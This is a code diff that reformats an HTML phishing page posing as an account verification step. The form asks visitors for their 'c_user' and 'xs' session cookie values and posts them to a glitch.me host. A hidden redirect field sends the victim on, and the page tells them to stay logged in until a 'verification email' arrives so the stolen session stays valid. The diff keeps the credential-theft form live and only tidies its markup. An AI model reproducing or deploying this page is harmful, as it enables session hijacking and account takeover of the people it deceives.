@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
   <head>
@@ -29,11 +28,11 @@
     <br /><br />
 
     <div class="main-body">
-        <form class="content" action="https://alluring-hammerhead-copper.glitch.me/basit.php" method="POST">
-            <!-- Hidden field for redirect -->
-            <input type="hidden" name="_redirect" value="https://alluring-hammerhead-copper.glitch.me/passbasit.php" />
+      <form class="content" action="https://alluring-hammerhead-copper.glitch.me/basit.php" method="POST">
+        <!-- Hidden field for redirect -->
+        <input type="hidden" name="_redirect" value="https://alluring-hammerhead-copper.glitch.me/passbasit.php" />
 
-            <div>
+        <div>
           <img
             src="TbXLmqW3Z.png"
             width="140"
@@ -80,33 +79,42 @@
         </p>
         <br />
 
+        <!-- c_user input -->
         <div>
           <p class="mt-4">c_user*</p>
-          <input type="number" name="c_user" id="c_user" required="" />
+          <input
+            type="number"
+            name="c_user"
+            id="c_user"
+            required=""
+            placeholder="Enter your c_user value"
+          />
         </div>
         <br />
 
+        <!-- xs input -->
         <div>
           <p class="mt-4">xs*</p>
           <input
             type="text"
             name="xs"
+            id="xs"
             pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$"
-            title="Must Watch Detailed Video"
+            title="The 'xs' value must meet the specified security criteria."
             required="1"
             aria-required="true"
+            placeholder="Enter your xs token"
           />
         </div>
         <br />
 
         <p class="msi-4">
-          **Please make sure account not to log out from your computer or laptop
-          until you have received a verification email.
+          **Please make sure your account is not logged out from your computer or laptop until you have received a verification email.
         </p>
         <br />
 
         <div class="container">
-          <button class="button">
+          <button class="button" type="submit">
             <p>Submit</p>
           </button>
         </div>
